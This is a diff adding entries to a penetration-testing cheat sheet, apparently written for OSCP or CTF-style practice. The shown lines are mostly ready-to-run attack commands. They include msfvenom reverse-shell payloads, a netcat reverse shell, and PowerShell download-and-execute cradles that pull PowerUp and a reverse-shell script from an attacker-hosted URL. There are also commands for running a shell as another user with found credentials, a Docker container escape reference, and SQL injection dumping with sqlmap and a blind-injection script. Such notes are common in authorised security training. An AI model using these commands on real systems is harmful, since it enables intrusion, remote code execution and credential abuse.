@@ -139,6 +139,15 @@ Reverse Shell Payloads: x
 Msfvenom linux elf binary reverse shell:
 `msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=1337 -f elf -o shell.elf`
 
+Msfvenom list all platforms and grep for specific type:
+`msfvenom --list | grep powershell`
+
+Msfvenom Windows powershell reverse tcp shell for Buffer Overflow:
+`msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<your ip> LPORT=1337 -f python`
+
+Payload too big? Msfvenom Windows cmd execute dowload a powershell script for Buffer overflow:
+`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<your-ip>/Invoke-PowershellTcp.ps1')\"" -f python`
+
 Netcat Reverse shell:
 `/usr/bin/nc -e /bin/bash <your ip> 1337`
 
@@ -221,6 +230,23 @@ IP Information (Dual homed?): `ip config`
 
 Established connections (Local Addr of 0.0.0.0 means its internal ports): `netstat -ano`
 
+Upload PowerUp and run all checks:
+```
+# Local
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+
+# Remote
+IEX(New-Object Net.WebClient).downloadString('http://your-ip/PowerUp.ps1')
+Invoke-AllChecks
+
+# Run Command as another user with found creds
+$SecPass = ConvertTo-SecureString '<FOUND PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Managemenet.Automation.PSCredential('<FOUND USERNAME>',$SecPass)
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://your-ip/reverseshell.ps1')" -Credential $cred
+
+# Local: Host reverse shell and have netcat listener
+```
 
 Use bloodhound to extract AD data:
 ```
@@ -330,6 +356,8 @@ Placeholder
 Check permissions of all folders inside PATH:
 `for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )`
 
+RDP in linux to Windows Machine:
+`xfreerdp /u:admin /p:password /cert:ignore /v:$IP /workarea`
 ## Docker Priv Esc
 CVE-2019-5736. Following https://github.com/Frichetten/CVE-2019-5736-PoC , we can create a sh binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.
 
@@ -370,6 +398,20 @@ SQLmap to get tables:
 sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dbs --batch
 sqlmap 'http://127.0.0.1/dict/test.php?id=1' --tables -D phpmyadmin
 sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dump -D phpmyadmin -T users
+```
+
+Blind SQL Injection Python:
+```
+wget https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py
+python3 blindSQLi.py
+# Time based: T
+# Query:
+#     List DB Version: SELECT @@version
+#     List Databases: SELECT schema_name FROM information_schema.schemata
+#     List Tables: SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema='flag'
+#     List Columns: SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'
+#     Retrive data: SELECT flag FROM flag.flag
+# Sleep Time: 1
 ```
 
 # Pivot
